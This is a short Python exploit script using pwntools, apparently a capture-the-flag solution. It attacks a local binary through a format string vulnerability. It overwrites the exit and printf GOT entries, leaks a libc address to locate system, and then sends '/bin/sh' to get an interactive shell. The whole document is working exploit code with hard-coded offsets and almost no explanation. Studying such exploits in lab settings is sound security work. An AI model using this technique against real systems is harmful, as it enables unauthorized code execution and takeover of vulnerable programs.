from pwn import *

binary = ELF('./a.out')

p = process('./a.out')
#6 onward is our string
gdb.attach(p)

s = "%{}c%9$n".format(binary.symbols['main'])
s += 'a'*(16-len(s)) + "%21$pzzz"
s += p64(binary.got['exit'])
p.sendline(s)
p.readuntil('0x')
base = int(p.readuntil('zz')[:-2],16)-0x26cca
system = base + 0x48f20

high = (system&0xffff0000)>>16
low = system&0xffff
send = binary.got['printf']
if high < low:
    tmp = high
    high = low
    low = tmp
    send2 = send
    send += 2
else:
    send2 = send+2
s = "%{}c%12$hn%{}c%13$hn".format(low,high-low)
s += 'a'*(48-len(s))
s += p64(send)+p64(send2)
p.sendline(s)
p.readuntil('aaa')

p.sendline('/bin/sh')


p.interactive()
